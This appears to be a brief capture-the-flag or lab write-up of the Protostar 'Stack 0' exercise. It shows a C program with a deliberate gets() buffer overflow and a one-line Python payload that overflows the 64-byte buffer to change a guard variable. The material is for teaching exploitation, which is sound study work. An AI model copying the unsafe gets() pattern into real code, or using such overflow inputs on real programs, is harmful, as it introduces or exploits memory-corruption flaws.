Stack 0

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

<p> 
So, to change the variable we need to overflow the allocated memory. <br>
In our case buffer has 64 bytes so to overflow buffer we need to 65 <br>
So just print 'A' 65 times
</p>

```shell
python -c "print('A' * 65)" | /opt/protostar/bin/stack0
```
